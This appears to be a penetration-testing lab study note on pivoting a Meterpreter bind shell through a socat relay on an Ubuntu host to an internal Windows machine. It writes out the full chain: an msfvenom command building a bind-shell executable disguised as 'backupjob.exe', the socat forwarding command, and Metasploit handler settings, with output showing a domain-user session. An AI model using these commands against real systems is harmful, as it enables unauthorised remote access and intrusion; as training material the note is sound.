# Socat Redirection with a Bind Shell

## Overview

This technique is similar to **socat redirection with a reverse shell**, but the flow is reversed in an important way.

With a **reverse shell**:

- the target initiates the connection back toward us

With a **bind shell**:

- the target opens a listener on its own port
- we connect in to it

In this scenario:

- the **Windows target** will run a bind shell payload on port `8443`
- the **Ubuntu pivot host** will run `socat` and listen on port `8080`
- `socat` will forward traffic from the Ubuntu host to the Windows target
- our **Metasploit bind handler** will connect to the Ubuntu pivot on `8080`
- the connection will then be relayed to the Windows target on `8443`

---

# Why Use This?

This is useful when:

- the target cannot initiate outbound connections reliably
- reverse shells are blocked or filtered
- you can reach a pivot host, but not the internal target directly
- the internal target can listen, but not call back

Think of this like putting a **reception desk** on the pivot host:

- Metasploit connects to the receptionist on `8080`
- the receptionist forwards the call to the Windows bind shell on `8443`

---

# Traffic Flow

## High-Level Path

```text
Attack host --> Ubuntu pivot:8080 --> socat --> Windows target:8443
```

## Breakdown

1. The Windows target runs a bind shell on port `8443`
2. The Ubuntu pivot listens on `8080`
3. Socat forwards incoming traffic from `8080` to `172.16.5.19:8443`
4. Metasploit connects to the Ubuntu pivot on `8080`
5. Socat relays the traffic to the Windows bind shell
6. Meterpreter session is established through the pivot

---

# Create the Windows Bind Shell Payload

Generate a Meterpreter bind payload for Windows.

## Command

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

## Example Output

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

## What This Does

- creates a Windows executable payload
- when executed, it will **listen** on port `8443`
- Metasploit can then connect to it using a bind handler

---

# Start the Socat Redirector on the Pivot Host

Now configure `socat` on the Ubuntu pivot to listen on `8080` and forward all traffic to the Windows target on `8443`.

## Command

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## Example

```text
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## What This Does

- `TCP4-LISTEN:8080`  
  Listen on TCP port `8080` on the Ubuntu pivot host

- `fork`  
  Handle multiple incoming connections

- `TCP4:172.16.5.19:8443`  
  Forward those connections to the Windows target’s bind shell listener

## In Plain English

This tells socat:

> “Listen here on port 8080, and anything that connects should be forwarded to the Windows host on port 8443.”

---

# Configure the Metasploit Bind Handler

Since this is a **bind shell**, Metasploit will **connect to the listener**, rather than wait for a callback.

Because we cannot reach the Windows target directly, we connect to the Ubuntu pivot on `8080`, and socat forwards the traffic onward.

## Start Metasploit

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

## Example Session

```text
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64

msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080

msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

---

# Important Note About `RHOST`

Here, Metasploit connects to:

- `10.129.202.64:8080`

That is the **Ubuntu pivot host**, not the Windows target directly.

Why?

Because `socat` is listening on the Ubuntu pivot and forwarding traffic onward to:

- `172.16.5.19:8443`

So Metasploit only needs to reach the pivot.

---

# Execute the Payload on the Windows Target

Transfer `backupjob.exe` to the Windows host using whatever file transfer method you have available, then run it.

Once executed:

- the Windows target will bind to port `8443`
- socat will already be waiting to relay traffic
- Metasploit will connect through the pivot and establish the session

---

# Successful Session Example

```text
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

# Understanding the Result

Notice the session line:

```text
10.10.14.18:46253 -> 10.129.202.64:8080
```

This reflects the connection from your attack host to the **pivot host**, not directly to the Windows target.

That is expected because:

- Metasploit connects to the Ubuntu pivot
- socat forwards that traffic
- the Windows target is hidden behind the relay

---

# Bind Shell vs Reverse Shell in This Context

## Reverse Shell

- target connects back to the pivot or attacker
- useful when outbound traffic is allowed

## Bind Shell

- target opens a listener
- attacker connects in
- useful when outbound traffic is blocked, but inbound access through a pivot is possible

## In This Scenario

The Windows target hosts the listener on `8443`, and the pivot makes that listener reachable from your side.

---

# Why Socat Works Well Here

Socat is a good fit because it is:

- simple
- fast to deploy
- protocol-agnostic at the TCP level
- easy to use for one-port relays
- useful when SSH forwarding is unavailable or unnecessary

It is acting purely as a **TCP redirector**, not as an exploitation tool.

---

# Common Pitfalls

## Wrong Payload Type

Make sure the payload is:

```bash
windows/x64/meterpreter/bind_tcp
```

Not a reverse payload.

## Wrong Port Mapping

The ports must line up correctly:

- Windows bind payload listens on `8443`
- socat forwards from Ubuntu `8080` to Windows `8443`
- Metasploit connects to Ubuntu `8080`

## Wrong Host in Handler

`RHOST` should be the **pivot host**, because that is where Metasploit can connect.

## Firewall Issues

Check that:

- the Windows host is actually listening on `8443`
- the Ubuntu pivot can reach `172.16.5.19:8443`
- your attack host can reach the Ubuntu pivot on `8080`

## Payload Not Executed

A bind shell will not exist until the payload is run on the Windows target.

---

# Quick Commands

## Create the Windows Bind Payload

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

## Start Socat on the Pivot

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## Start Metasploit Bind Handler

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

---

# Mental Model

A good way to picture this is:

- the **Windows target** opens a door on `8443`
- the **Ubuntu pivot** opens a door on `8080`
- socat connects the two doors together
- Metasploit walks through the pivot’s door and ends up at the Windows bind shell

So even though the internal Windows host is not directly reachable, the pivot makes it reachable.

---

# Key Takeaways

- A **bind shell** listens on the target instead of calling back
- `socat` can expose that bind listener through a pivot host
- Metasploit connects to the **pivot**, not directly to the internal target
- socat forwards that traffic to the Windows host
- This is a clean way to pivot into internal bind shells when direct access is not possible

---

# Tags

#pivoting  
#tunnelling  
#port-forwarding  
#socat  
#bind-shell  
#meterpreter  
#metasploit  
#windows  
#linux  
#obsidian